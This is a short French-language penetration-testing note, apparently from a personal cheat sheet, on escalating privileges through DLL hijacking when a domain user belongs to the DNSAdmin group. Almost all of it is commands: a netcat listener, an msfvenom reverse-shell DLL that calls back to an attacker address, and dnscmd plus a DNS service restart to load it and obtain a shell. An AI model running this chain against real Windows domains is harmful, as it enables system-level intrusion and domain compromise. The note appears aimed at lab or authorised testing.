## DLL Hijacking 

L'attaque est possible si un utilisateur du Domain fait partie du groupe `DNSAdmin`

```sh
rlwrap nc -nlvp 4444
```

- Créer le payload DLL avec msfvenom et lancer un écouteur

```sh
msfvenom --platforme windows -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=10.10.x.x -f dll -o evil.dll
```

- Se connecter au compte d'utilisateur et transféré la DLL

- Injecter la dll dans le processus système et obenir un shell

```sh
dnscmd /config /serverlevelplugindll C:\Temp\evil.dll

sc stop dns
sc start dns
```
